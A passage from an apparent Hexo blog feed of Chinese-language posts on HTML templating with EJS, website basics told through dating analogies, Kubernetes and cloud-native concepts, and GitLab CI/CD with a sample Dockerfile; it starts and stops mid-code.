class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>台灣<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>english<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>某些國家的語言像是波斯文，文字是由右至左進行閱讀的 HTML 也提供了 <code>dir</code> 這個屬性就可以做到，像是 <code>&lt;html dir=&quot;rtl&quot;&gt;</code> 或是 <code>&lt;h1 dir=&quot;rtl&quot;&gt;</code>。</p><p>不過在其他樣式上仍然需要微調，不過大致上設定完成後網頁的易讀性就已經高很多了，會知道這件事情是因為以前做過伊朗外包給我們公司的相關網站 <a href="http://saipa.polstargps.com/">Saipa Website</a>、<a href="http://kia.polstargps.com/">Kia Website</a>、<a href="http://hyundai.polstargps.com/">Hyundai Website</a>。</p><p>有個建議是可以直接寫在 html 或 body Tag 中，之後底下其他的直接繼承就不用再定，不過過往經驗 php send mail 的 html Body 裡面不能用<code>＂</code>，所以可能要寫成這樣 <code>body dir=RTL</code>。</p><p>以談戀愛來說，若是想要挑戰國際市場 CCR 時，除了 Body Language 以外，略懂略懂幾種語言的談情說愛方式也是理所當然的，若要針對區域優化，更改自己租屋的屬性加入男女分租的公寓也是個好方法。</p><h2 id="HTML-Template-Language"><a href="#HTML-Template-Language" class="headerlink" title="HTML Template Language"></a>HTML Template Language</h2><p>靜態網頁一般會一個頁面寫一個 HTML，但隨著頁面的增加就可以用樣板進行優化。</p><p>常見 HTML 的樣板語言像是 ejs 或是 pug，可以在原本的 HTML 中加入判斷、迴圈、模組化、套用模板等等優化的功能。</p><p>網頁實作上可以在 Server render 時將產生的 html string 使用 node 內建的 <a href="https://millermedeiros.github.io/mdoc/examples/node_api/doc/util.html">util.format()</a> 去取代相關變數:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">util.<span class="title function_">format</span>(final, x1, x2, x3, x4, x5);</span><br></pre></td></tr></table></figure><p>這類頁面其實就很適合透過樣板來進行處理，<a href="http://expressjs.com/zh-tw/guide/using-template-engines.html">express 文件</a> 官方建議的是 jade (後來的 Pug)，但需要習慣特殊語法，EJS 用法跟 JavaScript、HTML 語法很像較容易上手。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 設定相關位置</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;views&quot;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;views&quot;</span>));</span><br><span class="line"><span class="comment">// res.render 時使用解析引擎</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;ejs&quot;</span>);</span><br><span class="line"><span class="comment">// 使用物件傳遞參數</span></span><br><span class="line">res.<span class="title function_">render</span>(<span class="string">&quot;index&quot;</span>, &#123; x1, x2, x3, x4, x5 &#125;);</span><br></pre></td></tr></table></figure><p>然後就可以直接在裡面 <code>&lt;%-</code> 取 unescaped value，<a href="http://ejs.co/#docs">文件中有其他的詳細介紹</a>，行銷上以 facebook 社群分享的預覽畫面為例，也需要依照 <a href="http://ogp.me/">Open Graph protocol</a> 的規則搭配樣板引擎去抽換相關變數，透過 <a href="https://developers.facebook.com/tools/debug/sharing/">facebook 的偵錯工具</a>可以確認結果。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">prefix</span>=<span class="string">&quot;og: http://ogp.me/ns#&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Friends Blog --&gt;</span></span><br><span class="line">    *&lt;*% if(config.friends) &#123; %&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h5</span>&gt;</span>FRIENDS<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list-inline&quot;</span>&gt;</span></span><br><span class="line">      *&lt;*% config.friends.forEach(function(friend)&#123; %&gt;</span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;*&lt;*%= friend.href %&gt;&quot;</span>&gt;</span> *&lt;*%= friend.title %&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      *&lt;*% &#125;); %&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    *&lt;*% &#125;%&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      childValue = <span class="string">&quot;&lt;%- x1.childValue %&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>透過樣板的撰寫，就可以做到在同樣版型的頁面顯示個別內容，以交友的角度來看，就會是歐兔版常見的罐頭發文或信件嗎?!</p><p>要寄信給女孩子自我介紹的時候，基本的架構其實大多相同，僅僅是內容和版面略有落差，這也就是為什麼每篇文章最後都會防罐頭了。</p>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>網站元素概觀</title>
      <link href="/2022/09/04/relationships-between-frontend-and-backend/html-build-a-site/"/>
      <url>/2022/09/04/relationships-between-frontend-and-backend/html-build-a-site/</url>
      
        <content type="html"><![CDATA[<p>網站由網頁組成，網頁是構成網站的基本元素，網頁會是以檔案形式存放在伺服器。</p><h2 id="網頁構成"><a href="#網頁構成" class="headerlink" title="網頁構成"></a>網頁構成</h2><ol><li>HTML：透過標籤描述網頁架構與組成</li><li>CSS：視覺呈現，像是設定設置版面編排、文字背景顏色等</li><li>JavaScript：呈現網頁動態效果動作與各種互動功能</li></ol><p>用比較生活化的例子來譬喻，身為一個男孩子要怎麼讓女孩子能夠認識你呢?</p><h3 id="HTML-是什麼"><a href="#HTML-是什麼" class="headerlink" title="HTML 是什麼?"></a>HTML 是什麼?</h3><p>HTML 在網頁中是透過標籤來描述架構與組成。</p><p>舉例來說 <code>#兒子</code> <code>#哥哥</code> <code>#舅舅</code> <code>#工程師</code> <code>#公民</code> 都可以用來描述一個人的組成。</p><p>像我朋友在某個狗狗交友軟體上的 Tag 就會是</p><p><code>#學習建立持續不斷的踏實</code> <code>#學著有原則的生活</code><br><code>#喜歡吃火鍋</code> <code>#喜歡吃漢堡</code> <code>#喜歡吃焗烤</code><br><code>#喜劇片</code> <code>#韓劇</code> <code>#慢跑</code> <code>#山林踏青</code><br><code>#棉花糖</code> <code>#吳汶芳</code> <code>#白安</code> <code>#五月天</code> <code>#八三夭</code><br><code>#喜歡讀非專業和文學以外的書</code></p><h3 id="CSS-是什麼"><a href="#CSS-是什麼" class="headerlink" title="CSS 是什麼?"></a>CSS 是什麼?</h3><p>在網頁中用來描述可以變換的外顯特質，來控制網頁當下呈現的樣貌。</p><p>舉例來說<strong>短</strong>頭髮、<strong>灰色</strong>衣服、<strong>半框眼鏡</strong>、<strong>網路產業</strong>的工程師，這些特質能描繪出來這個人目前的外貌。</p><h3 id="JavaScript-是什麼"><a href="#JavaScript-是什麼" class="headerlink" title="JavaScript 是什麼?"></a>JavaScript 是什麼?</h3><p>JavaScript 在網頁中的腳色是著重在賦予網頁動態效果與互動功能。</p><p>以我朋友的例子來說，像是可以指定時間接送可愛女生上下班、可以天天陪喜歡的女朋友吃晚餐等等。</p><h2 id="網頁分類"><a href="#網頁分類" class="headerlink" title="網頁分類"></a>網頁分類</h2><p>網頁依照實際應用型態來分會分成靜態網頁和動態網頁兩種，以男女之間相處的例子來譬喻</p><ul><li>靜態網頁: 給相親照或是交友軟體上所看到預先編輯好的呈現樣貌</li><li>動態網頁: 實體約了見面，會在不同的場地、時間、氣氛做出不同的表現</li></ul><h3 id="靜態網頁"><a href="#靜態網頁" class="headerlink" title="靜態網頁"></a>靜態網頁</h3><p>沒有套用任何程式單純顯示內容，適合用在簡單比較不常改變的頁面，通常也不會有網站的後端。</p><p>優點: 撰寫容易、通常效能較佳<br>缺點: 若長期會有穩定增加需求則較難維護</p><p>以部落格來說，一般是透過像是 hugo 或是 hexo 這類靜態網頁產生工具將文檔產生成靜態網頁構成的網站，以追女生來說，用一個公版介紹灑網捕魚也許就不是一個好方式。</p><h3 id="動態網頁"><a href="#動態網頁" class="headerlink" title="動態網頁"></a>動態網頁</h3><p>動態網站適用資料內容多元，更新快速的網頁，透過程式方便管理網站也大幅降低維護成本。</p><p>一般會和後端進行互動，以實際應用也會區分成伺服器渲染 (Server Render) 和單頁應用 (Single Page Application) 兩種形式</p><ul><li>伺服器渲染 (Server Render): 網頁在伺服器端進行相關運算及資料整理後才將生成的靜態網頁送回使用者專</li><li>單頁應用 (Single Page Application): 網頁只先載入必要的框架，等到使用者真的索取資料時，才將資料套用在前端的網頁介面中</li></ul><p>動態，大概就屬於能快速認識女孩子並且交到女朋友的方式。動態的每天更換自我狀態或介紹 (也許參考時事也許星座運勢)，並且每天都透過各種通路去找女孩子聊天，去嘗試獲得不同的回應。</p><h2 id="網站架設"><a href="#網站架設" class="headerlink" title="網站架設"></a>網站架設</h2><ul><li>靜態網站: 只需要將檔案放置在伺服器上，並透過 DNS 設定公開在網路上提供使用即可</li><li>動態網站: 通常會搭配後端使用，所以需要額外架設後端程式以及資料庫的運行環境，以 WordPress 來說就是 PHP 跟 MySQL，架設完成後才能進行 DNS 的設定</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>雲原生 (Cloud Native) X K8s (Kubernetes)</title>
      <link href="/2022/08/07/devops-cloud-native/"/>
      <url>/2022/08/07/devops-cloud-native/</url>
      
        <content type="html"><![CDATA[<h2 id="雲原生-Cloud-Native"><a href="#雲原生-Cloud-Native" class="headerlink" title="雲原生 (Cloud Native)"></a>雲原生 (Cloud Native)</h2><p>雲原生 (雲端 + 原生) 是在雲端原生架構上來規劃設計更方便擴展 (Scalable) 的軟體服務或應用。</p><p>為什麼會演變到雲原生 (Cloud Native)? 這跟軟體的開發、架構、運算和儲存單元演進有關</p><ul><li>軟體開發: 瀑布式開發 -&gt; 敏捷式開發 -&gt; DevOps</li><li>軟體架構: 單層式架構 -&gt; 多層式架構 -&gt; 微服務</li><li>運算單元: 實體機 -&gt; 虛擬機 -&gt; 容器化</li><li>儲存單元: 資料中心 -&gt; 服務代管 -&gt; 雲端 (公有、私有、混合)</li></ul><p>雲端原生常見架構和技術</p><ul><li>微服務 (Microservice)</li><li>容器 (Container)</li><li>容器管理 (Kubernetes)</li><li>服務網格 (Service meshes)</li><li>不可變的基礎設施 (Immutable infrastructure)</li><li>聲明式 API (Declarative API)</li></ul><p>Cloud Native Computing Foundation (CNCF) 定義了導入雲原生的主要五個步驟</p><ol><li>容器化</li><li>CI&#x2F;CD</li><li>編排與應用定義，像是 HELM</li><li>可觀測性與分析，常見的像是普羅米修斯或是 Fluentd</li><li>服務代理、發現、網格 (Service Mesh)</li></ol><h2 id="微服務-Microservice"><a href="#微服務-Microservice" class="headerlink" title="微服務 (Microservice)"></a>微服務 (Microservice)</h2><p>微服務其實就是將大型單體架構的服務，分別依照屬性或業務邏輯拆分部屬後的服務，透過雲端的架構可以更好的水平或垂直擴展並且進行迭代和更新。</p><p>部屬過後增加的複雜度是</p><ol><li>更多服務間的溝通需要被連結</li><li>更多的服務生命週期需要被管理和監控</li><li>服務重啟的時候該怎麼做到 Zero Downtime</li></ol><p>通常一個微服務用觀念的角度看，主要會包含 Service 跟 Job 兩個部分</p><ol><li>Service<ul><li>Non-Background Service: 不能死掉的服務</li><li>Background Service: 像是監控之類的服務</li></ul></li><li>Job<ul><li>One Time Job: 服務起來之後需要執行的</li><li>Cron Job: 定時執行</li></ul></li></ol><p>Service Cluster 的概念也蠻值得理解的，通常就是用來處理</p><ol><li>增加高可用性 (High Availability) 或是備援，</li><li>拿來做附載平衡 (Load Balancing)</li><li>增加平行運算的處理量。</li></ol><p>常見的 HA 模式，需考量多台機器怎麼互相知道對方狀態以及能自動啟動或停止，停止後怎麼恢復相關的資料。</p><ul><li>Active&#x2F;Passive Mode (AP) 或是 Active&#x2F;Standby Mode (AS): 用途是 HA 一台起著一台待命</li><li>Active&#x2F;Active Mode (AA): 用途是 Load Balancing 跟 AP 差別不大，問題是當 AA 有一台掛了之後只剩一台能不能撐住兩台的流量</li></ul><h2 id="容器-Container"><a href="#容器-Container" class="headerlink" title="容器 (Container)"></a>容器 (Container)</h2><p>微服務不一定需要容器實現，但容器相對於虛擬機較輕量也更方便去封裝和部屬。</p><p>容器是一個透過受設定檔建置出來的映象檔運行起來的服務</p><ul><li>Docker Container: Image 執行後會產生的執行環境</li><li>Image: 透過 IaC (Infrastructure as Code) 來定義服務執行環境所建置出來的映象檔</li><li>Repository: 存放 Image 的地方</li></ul><p>PS: Jave EE Web 的容器是用來 deploy 各種 Web Application 用的，概念不太一樣</p><h2 id="容器管理-Kubernetes"><a href="#容器管理-Kubernetes" class="headerlink" title="容器管理 (Kubernetes)"></a>容器管理 (Kubernetes)</h2><p>Kubernetes 是管理容器與服務的開源平台，主要分 Control Plane 跟 Worker Node 兩大塊，寫應用主要關注 Worker Node。</p><ul><li><p>Control Plane</p><ul><li>kube-apiserver: 對外</li><li>etcd: 紀錄狀態方便 failover</li><li>kube-scheduler</li><li>kube-controller-manager</li><li>cloud-controller-manager</li></ul></li><li><p>Worker Node</p><ul><li>kubelet</li><li>kube-proxy</li><li>container runntime</li></ul></li></ul><p>Worker Node 用層級來看</p><ul><li>Cluster: 多個 Node 的集合<ul><li>Node: 可以看成是某台 VM，Work Node 會負責把 Pod 跑起來<ul><li>Namespaces: 可以依照使用情境或產品別去分類及管理相關的 Deployment<ul><li>Deployment: 依照需求透過 ReplecaSet 描述 Pod 要開多少個怎麼去 Deploy<ul><li>Pod: 最小的 Deploy 單位，包含多個 container<ul><li>Container: Docker 的容器</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><p>在管理 Pod 上通常會透過 Deployment 來進行部屬 Deployment -&gt; ReplicaSet -&gt; Pod，除了 ReplicaSet 還有兩種部屬 Pod 的方法</p><ul><li>Deployment、ReplicaSet: 通常跟狀態無關</li><li>statefulset: 像是資料庫服務需要一對一的關係就適合使用</li><li>daemonset: 較偏系統面 (ex: 收 Log 的服務)，寫 AP 的較不需要處理</li></ul><p>一個 Kubernetes Components 主要包含 Pod 跟 Service 兩個部分</p><ul><li>Pod: 最小的 Deploy 單位，描述服務是怎麼構成和產生<ul><li>image</li><li>port</li></ul></li><li>Service: 描述如何存取服務，Ingress -&gt; Service -&gt; Pod<ul><li>protocol</li><li>port</li><li>node port</li><li>target port 會對應到 Pod 的 port</li></ul></li></ul><p><strong>為什麼要使用 Kubernetes，相關的考量和優缺點有哪些?</strong></p><p>原來可以跑的服務，放到 K8s 上不一定可以跑，維護上需思考服務設計是否適合放在 k8s 上，舉例來說 OOM 後會關掉並重啟，相關的機制該怎麼設計?</p><ul><li>K8s 維運相關設定: 要給多少 CPU、MEM 才可以避免 OOM 的問題</li><li>Failover、debug: 服務並不會因為架在不同地方就變得更不穩定，但 k8s 因為多了一層會增加 debug 的難易度</li><li>升級或是修補漏洞: k8s 的 node 會需要常常更新，服務要怎麼做到 Zero Downtime</li></ul><p>Kubernetes 的好處在於統一的管理介面，並且因為是 IaC 的關係，所有的人都無法像以前一樣直接 Access Node 意味著服務就會更加安全，操作並不會變簡單但會統一。</p><ul><li>資料的備份與恢復: 方便程度代管服務 &gt; K8s &gt; VM</li><li>監控、觀測與警示: 方便程度代管服務 &gt; K8s &gt; VM，K8s 已有解決方案</li></ul><p>成本上需要考量執行成本、維護成本、人力成本，要達到同樣的效能在各個環境 (VM、代管服務、K8s) 的成本會不一樣。</p><ul><li>最佳化: 通常實體機或是 VM 的最佳化都比較簡單調整，K8s 較複雜</li><li>人力成本: 放 k8s 上維護知識需要理解服務、VM、k8s</li></ul><h2 id="服務網格-Service-meshes"><a href="#服務網格-Service-meshes" class="headerlink" title="服務網格 (Service meshes)"></a>服務網格 (Service meshes)</h2><p>支持微服務之間通訊與溝通問題的一種技術，常見的解決方案為 Istio，微服務在啟動後都會透過服務代理 (Sidecar Proxy) 來處理。</p><p>有看到兩種名詞:</p><ul><li>Container Network Interface (CNI): 管理分配 Pod IP，管理相關連接網路的能力與限制</li><li>Software Defined Networking (SDN): 軟體定義網路，用軟體去管理和維護網路相關的決策，舉例來說 Nginx 就是很好的附載平衡軟體定義網路代理，附載平衡這件事也可以用硬體做到。</li></ul><h2 id="不可變的基礎設施-Immutable-infrastructure"><a href="#不可變的基礎設施-Immutable-infrastructure" class="headerlink" title="不可變的基礎設施 (Immutable infrastructure)"></a>不可變的基礎設施 (Immutable infrastructure)</h2><p>當服務被部屬後就不可被修改，若有需要更新都需要透過 YAML 檔來更新 IaC (Infrastructure as Code)，舉例來說透過 label 來建立 Deployment 和 Service 之間的連結後，需要注意的是 Label 不能修改名稱，所以會影響服務的維運方式。</p><h2 id="聲明式-API-Declarative-API"><a href="#聲明式-API-Declarative-API" class="headerlink" title="聲明式 API (Declarative API)"></a>聲明式 API (Declarative API)</h2><p>告訴電腦該完成什麼，顯示的是結果，所以每次修改都是透過 kubectl apply YAML 來驅動相關的改變。</p>]]></content>
      
      
      <categories>
          
          <category> 軟體工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 軟體工程 </tag>
            
            <tag> DevOps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitlab CI/CD 教學</title>
      <link href="/2022/05/30/devops-gitlab-ci-and-gitlab-runner/"/>
      <url>/2022/05/30/devops-gitlab-ci-and-gitlab-runner/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-CI-CD"><a href="#什麼是-CI-CD" class="headerlink" title="什麼是 CI&#x2F;CD?"></a>什麼是 CI&#x2F;CD?</h2><p>CI (Continuous Integration)、CD (Continuous Delivery&#x2F;Deployment) 目的是從測試、建置到部署自動化，取代原來人工需要做的事情。</p><ul><li>CI (Continuous Integration): 專注在持續整合，透過程式碼的自動化測試和建置，將穩定品質的程式碼合併，越早頻繁整合，整合難度的就越低且能確保最新版本是可運行的</li><li>CD (Continuous Delivery&#x2F;Deployment): 專注在持續部屬和交付，依照需要的環境進行建置和部屬</li></ul><p>在相關版本控制工具尚未推出 CI&#x2F;CD 服務前，常見的會是 Jenkins，但使用者入門大多使用 GUI 進行配置與操作，所以 GUI 在多人編輯的情況下，配置的版本控制就稍微困難。</p><p>近代在 YAML 出現之後，Code as Infrastructure 成為顯學，透過將雲端配置用程式碼描述，即使是 Jenkins UI 非常方便也建議透過程式碼來進行配置。</p><p>目前常見的 Github Aciton 和 Gitlab CI 其實都是透過 YAML 進行設定與配置</p><ul><li>定義必要的 “觸發條件”、”環境”、”步驟”</li><li>讀取預先設定的環境變數進行建置、上板</li></ul><h3 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h3><p>DevOps (Development Operations)，是一種新的概念與職缺，透過將系統容器化搭配 CI&#x2F;CD 並建立 Infrastructure as code (IaC)，進而達到自動並有效率的維運雲端的資源和系統，節省時間與成本。</p><p>CI pipline -&gt; 產生 Docker Image<br>CD pipline -&gt; Pull Docker Image -&gt; 環境檔 -&gt; 部屬容器</p><h3 id="Infrastructure-as-code-IaC"><a href="#Infrastructure-as-code-IaC" class="headerlink" title="Infrastructure as code (IaC)"></a>Infrastructure as code (IaC)</h3><p>將架構透過程式碼表示的好處</p><ul><li>可程式化代表可做到驗證與防呆</li><li>能夠進版控</li><li>更容易擴充</li></ul><iframe width="560" height="315" src="https://www.youtube.com/embed/stnz7zn5MRc" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>Docker 是一種容器化技術，能夠將系統透過 Container 運行。</p><ul><li>Image: 透過映像檔的建立將環境重複使用</li><li>Container: 是 Image 運行起來的狀態，會搭配環境變數和配置去運行</li></ul><p>因此開發或是正式環境能維持隔離減少彼此影響，更容易維護和升級。</p><p>常見的 Docker 預備知識</p><ul><li>YAML: Image 透過 YAML 描述和建置</li><li>Docker Config:<ul><li>Port binding: 容器內的系統會透過 Port 提供服務，所以需要和本機上的 Port 做連結</li><li>Logs: 透過容器的 Log 來查看系統紀錄</li><li><code>--network=host</code>: 容器網路的模式</li><li><code>-d</code>: 背景執行</li></ul></li></ul><p>管理容器的工具軟體</p><ul><li>Docker Compose: 組合多個 container 依照順序啟動的一個工具</li><li>Docker Swarm: 原生容器調度管理平台，適合處理多部伺服器部屬多個容器的情境</li><li>Kubernetes: 容器調度管理平台，適合處理多部伺服器部屬多個容器的情境</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Set the base image to node:16-alpine</span></span><br><span class="line"><span class="string">FROM</span> <span class="string">node:16-alpine</span> <span class="string">as</span> <span class="string">build</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify where our app will live in the container</span></span><br><span class="line"><span class="string">WORKDIR</span> <span class="string">/app</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy the React App to the container</span></span><br><span class="line"><span class="string">COPY</span> <span class="string">.</span> <span class="string">/app/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare the container for building React</span></span><br><span class="line"><span class="string">RUN</span> <span class="string">npm</span> <span class="string">install</span></span><br><span class="line"><span class="string">RUN</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">react-scripts</span> <span class="string">-g</span></span><br><span class="line"><span class="comment"># We want the production version</span></span><br><span class="line"><span class="string">RUN</span> <span class="string">npm</span> <span class="string">run</span> <span class="string">build</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare nginx</span></span><br><span class="line"><span class="string">FROM</span> <span class="string">nginx:1.16.0-alpine</span></span><br><span class="line"><span class="string">COPY</span> <span class="string">--from=build</span> <span class="string">/app/build</span> <span class="string">/usr/share/nginx/html</span></span><br><span class="line"><span class="string">RUN</span> <span class="string">rm</span> <span class="string">/etc/nginx/conf.d/default.conf</span></span><br><span class="line"><span class="string">COPY</span> <span class="string">nginx/nginx.conf</span> <span class="string">/etc/nginx/conf.d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fire up nginx</span></span><br><span class="line"><span class="string">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="string">CMD</span> [<span class="string">&quot;nginx&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;daemon off;&quot;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="專案的準備"><a href="#專案的準備" class="headerlink" title="專案的準備"></a>專案的準備</h3><p>版本控制: 依照版本持續整合<br>程式碼分析: 檢查 code style 或基本語法錯誤<br>建置: 確保程式碼真的可以被建置與執行<br>自動化測試: 確保功能正常與軟體品質<br>自動的部署: 用同一個包裝好的套件 (package) 透過環境檔來控制和部署任何版本的軟體到不同的環境</p><h2 id="Gitlab-CI"><a href="#Gitlab-CI" class="headerlink" title="Gitlab CI"></a>Gitlab CI</h2><p>一個 <code>.gitlab-ci.yml</code> 如前述會包含 “觸發條件”、”環境”、”步驟”</p><ul><li>觸發條件: PR、PUSH、分支合併</li><li>環境: Node、Python、Java 等等</li><li>步驟: 常見會有三個步驟<ul><li>verify: 透過 Linter 或是測試確認程式碼品質</li><li>Package: Build Code</li><li>Release: APK 就會是包版、前後端就會是上版</li></ul></li></ul><blockquote><img src="https://docs.gitlab.com/ee/ci/pipelines/img/pipeline_stage_view_v16_11.png" width="100%" height="500px">圖片來源: https://docs.gitlab.com/ee/ci/pipelines/</blockquote><p>主要是透過 <code>.gitlab-ci.yml</code> 來定義相關的步驟，當步驟設定完成後，會需要了解兩個概念</p><ul><li>pipeline<ul><li><a href="https://gitlab.com/gitlab-org/gitlab/-/pipelines/166785558">https://gitlab.com/gitlab-org/gitlab/-/pipelines/166785558</a></li></ul></li><li>gitlab runner: 負責運行 pipeline 中 job<ul><li>Shared Runner: 不同的專案可以共用</li><li>Group Runners: 同開發群組 (部門) 共用</li><li>Specific Runner: 指定給特定專案使用，小編在實務上也會透過 Specific Runner 來指定要發佈的環境</li></ul></li></ul><p>常用指令</p><ul><li><code>sudo gitlab-runner register</code>，有 docker 或是 shell 的區別<ul><li>docker in docker 版本比較適合跑一些 lint</li><li>shell 版本可以拿來操作本機上 docker 較適合拿來部屬</li></ul></li><li><code>gitlab-runner verify --delete</code></li></ul><h3 id="gitlab-ci-yml-案例解析"><a href="#gitlab-ci-yml-案例解析" class="headerlink" title=".gitlab-ci.yml 案例解析"></a>.gitlab-ci.yml 案例解析</h3><p>以一個前端專案來說，常見需要人工介入的情況有</p><ul><li>進行程式碼的 lint<ul><li>style lint</li><li>eslint</li></ul></li><li>依照環境<ul><li>進行 npm install</li><li>建置各站台的版本</li></ul></li><li>上傳到各個不同環境的站台</li><li>進行單元測試</li><li>進行 E2E 測試</li></ul><p>實作</p><ol><li>變數設定，因為 config 會是一個公開的檔案，通常不會希望直接把 key 或是 token 直接放在裡面，這時候就會透過變數來存取及互動</li><li>步驟實作<ul><li>透過 GUI 的畫面</li><li>透過 config 的 stages 或 steps</li></ul></li><li>觸發條件<ul><li>排程</li><li>分支變化</li><li>使用者動作</li></ul></li></ol><p>常見問題</p><ol><li>透過 GUI 的介面較容易直觀的去設定 ssh key 或是相關的登入帳號密碼，透過 yaml config 就會稍微複雜一些，通常會是需要直接設定到 Linux 的環境當中。</li><li>CI&#x2F;CD 的過程中在設定的時候需要等實際跑過一遍才知道問題出在哪，會需要大量花時間去試錯<ul><li>Gitlab 的介面中有 ci lint 可以使用</li><li>Github Action 有很多網友實作的工具蠻建議直接套用</li></ul></li><li><a href="https://medium.com/trendyol-tech/running-cypress-tests-parallel-in-gitlab-pipeline-56b1fa4cb286">平行處理加速效能</a></li><li>重要變數儲存 <code>Environment Variable</code>，讓 Runner 啟動後將這些資訊設為<code>環境變數</code>，Gitlab 就有提供這方面的設定，可以先進到 <code>Gitlab Project &gt; Settings &gt; CI / CD &gt; Variables</code> ，便在裡面逐一設定上方有宣告的變數。</li></ol><p>詳細文件請參考:<br><a href="https://docs.gitlab.com/ee/ci/yaml/index.html">https://docs.gitlab.com/ee/ci/yaml/index.html</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 